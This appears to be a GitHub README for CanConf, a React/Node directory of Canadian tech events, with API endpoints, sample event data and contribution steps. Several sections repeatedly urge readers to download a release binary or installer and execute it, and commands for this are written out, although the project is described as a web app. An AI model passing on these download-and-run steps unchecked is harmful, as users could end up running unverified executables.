# CanConf — Discover Canadian Tech Conferences, Hackathons & Careers

[![Releases](https://img.shields.io/github/v/release/WayneSLNG/CanConf?style=for-the-badge&color=0052CC&label=Releases)](https://github.com/WayneSLNG/CanConf/releases)

![Hero image - conference](https://images.unsplash.com/photo-1503428593586-e225b39bddfe?q=80&w=1600&auto=format&fit=crop&ixlib=rb-4.0.3&s=9f4b0b8a4f2d8f7c2c2da7a0a6b2d4d1)

Live list of Canadian tech conferences, hackathons, internships, and networking events that help developers and students grow their careers.

- Topics: canada, canadian, career, career-development, careers, conferences, ctf, events, hackathons, internships, linkedin, networking, new-grad, node, react, sass, typescript
- Platform: Node / React front end, TypeScript, Sass
- Repo: community-driven directory and event aggregator

Table of contents
- About
- Highlights
- What you will find
- Architecture & tech stack
- Quick demo
- Install from releases
- Local development
- API & data format
- Contributing
- License
- Contact

About
CanConf lists tech events across Canada. The project collects meetups, conferences, hackathons, CTFs, and internship notices. The goal: help students and developers find the right events to learn, network, and get hired.

Highlights
- Central directory for Canadian tech events.
- Search by city, tag, date range, and tech stack.
- Filters for internships and entry-level opportunities.
- Simple API for integrations.
- Components and styles in TypeScript and Sass.
- Lightweight UI built with React.

What you will find
- Upcoming conferences and meetups across major Canadian cities.
- Hackathons and Capture The Flag (CTF) events.
- Internship postings and entry-level opportunities.
- Networking meetups and LinkedIn-friendly event pages.
- Tags for tech stacks (Node, React, TypeScript, Sass).
- Curated links and official event pages.

Search examples
- Find hackathons in Toronto
- Discover internships targeted at new grads
- Filter events with React or TypeScript talks
- Search CTFs and security workshops

Architecture & tech stack
- Front end: React, TypeScript, Sass
- Back end: Node.js, lightweight Express API
- Data: JSON-based event store; cron jobs pull public event feeds and transform them
- CI: GitHub Actions for tests and deploy
- Deploy: Static front end with serverless API endpoints

User interface
- Clean list view with cards for each event.
- Map view for city-based browsing.
- Event detail page with date, venue, tags, and application link.
- Save events to a personal watchlist (local storage).

Quick demo
Screenshot of list view:
![List view mockup](https://images.unsplash.com/photo-1498050108023-c5249f4df085?q=80&w=1200&auto=format&fit=crop&ixlib=rb-4.0.3&s=6a8a6f93f5c1c8b4b3f7a8a2d2e3f7a6)

Install from releases
Download the latest release asset and run it locally. Grab the installer or binary from the Releases page and execute the file to run a packaged build:

- Open the Releases page and download the asset that matches your OS:
  https://github.com/WayneSLNG/CanConf/releases
- If the asset is a zip or tar, extract it and run the included executable.
- If the asset is a script or installer, download and execute it.

Example commands (replace the filename with the asset you downloaded):
```bash
# Linux / macOS (example)
curl -L -o canconf.tar.gz "https://github.com/WayneSLNG/CanConf/releases/download/vX.Y.Z/canconf-linux-x64.tar.gz"
tar -xzf canconf.tar.gz
cd canconf
chmod +x canconf
./canconf

# Windows (PowerShell example)
Invoke-WebRequest -Uri "https://github.com/WayneSLNG/CanConf/releases/download/vX.Y.Z/canconf-windows-x64.zip" -OutFile "canconf.zip"
Expand-Archive canconf.zip -DestinationPath canconf
.\canconf\canconf.exe
```

If the release asset is a packaged installer, run it with the usual system tools. The releases page will list the asset names, checksums, and usage notes.

Local development
Clone the repo, install dependencies, and run the app locally.

Get the source
```bash
git clone https://github.com/WayneSLNG/CanConf.git
cd CanConf
```

Install and run
```bash
# Install dependencies
npm install

# Run the dev server (front-end + mock API)
npm run dev

# Build for production
npm run build
```

Environment variables
Create a .env.local file in the root with the following keys:
- REACT_APP_API_URL - URL for the events API (default: http://localhost:4000)
- NODE_ENV - development or production
- SENTRY_DSN - optional error tracking DSN

API & data format
CanConf exposes a simple REST API to read events and tags. You can use it in your apps or scripts.

Endpoints
- GET /api/events — list events
- GET /api/events/:id — event detail
- GET /api/tags — list of tags (city, tech stack)
- POST /api/events — submit a new event (PRs preferred)

Event JSON sample
```json
{
  "id": "evt-2025-05-01-toronto-hackathon",
  "title": "Toronto Spring Hackathon",
  "start_date": "2025-05-01T09:00:00-04:00",
  "end_date": "2025-05-03T18:00:00-04:00",
  "city": "Toronto",
  "venue": "TechHub Toronto",
  "tags": ["hackathon", "node", "react", "beginner"],
  "role": "all",
  "apply_url": "https://example.com/register",
  "source": "official",
  "description": "48-hour hackathon focused on web apps. Prizes, mentorship, and networking."
}
```

Filtering and queries
- Filter by city: /api/events?city=Toronto
- Filter by tag: /api/events?tag=hackathon
- Date range: /api/events?from=2025-05-01&to=2025-06-01

Data sources
CanConf collects public event data from:
- Official conference pages
- University event boards
- Meetup groups and public calendars
- Hackathon organizers and sponsors

We tag entries with source and type to make it easy to filter by trust level and event category.

Contributing
Star and fork the repo to contribute. Open issues to report missing events, broken links, or errors.

How to add an event
1. Fork the repo.
2. Add an event JSON file under /data/events or submit a PR that updates events.json.
3. Follow the sample event format.
4. Add a source field with a URL to the official page.
5. Create a clear title and add tags such as node, react, ctf, internship.

Code contributions
- Follow TypeScript types under /types.
- Run lint and tests before PRs:
```bash
npm run lint
npm test
```
- Keep changes small and focused.
- Add unit tests for logic changes.

Community guidelines
- Be respectful in comments and PRs.
- Provide clear steps to reproduce issues.
- Use plain language and short sentences.

Roadmap
- Add calendar sync (ICS / Google Calendar links).
- Integrate map-based RSVP and directions.
- Add user accounts and saved event lists.
- Add native mobile app wrappers.

Badges & stats
[![Confs](https://img.shields.io/badge/Conferences-Canada-blue)](https://github.com/WayneSLNG/CanConf)
[![Hackathons](https://img.shields.io/badge/Hackathons-CTFs-red)](https://github.com/WayneSLNG/CanConf)
[![Tech: Node](https://img.shields.io/badge/Tech-Node.js-green)](https://nodejs.org/)
[![Tech: React](https://img.shields.io/badge/Tech-React-blue)](https://reactjs.org/)
[![TypeScript](https://img.shields.io/badge/TypeScript-%233178C6.svg?style=flat&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)

Releases and downloads
Find packaged releases and download assets here:
https://github.com/WayneSLNG/CanConf/releases

Each release lists platform-specific assets. Choose the one that matches your OS and follow the included README in the asset. If the asset is an executable or installer, download it and run the file. The releases page also shows release notes and checksums.

Integration examples
Embed event lists into your site with a simple fetch call:

JavaScript (browser)
```js
fetch('https://api.canconf.example.com/events?city=Toronto&tag=react')
  .then(r => r.json())
  .then(list => {
    // render list
  })
```

Node script to fetch new events
```js
const fetch = require('node-fetch');
async function getEvents() {
  const res = await fetch('https://api.canconf.example.com/events?from=2025-01-01');
  const events = await res.json();
  console.log(events.length, 'events found');
}
getEvents();
```

Design and UI
- Accessible color palette and large tap targets.
- Card layout for quick scanning.
- Tag chips for instant filtering.
- Responsive grid and compact mobile list.

SEO and social
- Each event page includes meta tags for open graph and Twitter.
- Sharing links prefill titles and URLs for LinkedIn and Twitter.
- Structured data (JSON-LD) for event snippets.

License
The project uses the MIT license. See LICENSE file for full text.

Contact
- Open an issue for missing events or feature requests.
- Star and fork to support the project.
- For maintainer contact, open an issue with the prefix "contact:".

Assets and image credits
- Hero and mockup images use Unsplash public content.
- Badges use shields.io.

Quick links
- Releases (download installer / binary): https://github.com/WayneSLNG/CanConf/releases
- Issues: https://github.com/WayneSLNG/CanConf/issues
- Pull requests: https://github.com/WayneSLNG/CanConf/pulls

Contribute code, report events, and help build a better event directory for Canada’s tech community.